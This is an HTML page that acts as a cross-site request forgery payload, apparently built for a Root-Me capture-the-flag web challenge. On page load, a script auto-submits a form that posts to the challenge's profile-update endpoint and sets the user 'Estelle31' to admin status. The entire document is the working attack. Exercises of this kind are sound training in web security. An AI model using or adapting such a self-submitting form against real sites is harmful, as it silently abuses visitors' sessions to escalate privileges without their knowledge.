<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire automatique</title>
</head>
<body>
   <div>
        <fieldset><legend>Update Profile</legend>
        <form id="updateProfileForm" action="http://challenge01.root-me.org/web-client/ch22/action=profile" method="post" enctype="multipart/form-data">
        <div class="form-group">
        <label>Username:</label>
        <input type="text" name="username" value="Estelle31">
        </div>
        <br>        
        <div class="form-group">
        <label>Status:</label>
        <input type="checkbox" name="status" value="admin" checked="checked">
        </div>
        <br>    
        <button type="submit">Submit</button>
        </form></fieldset>
        </div>

    <script>
       document.getElementById('updateProfileForm').submit();
    </script>
</body>
</html>

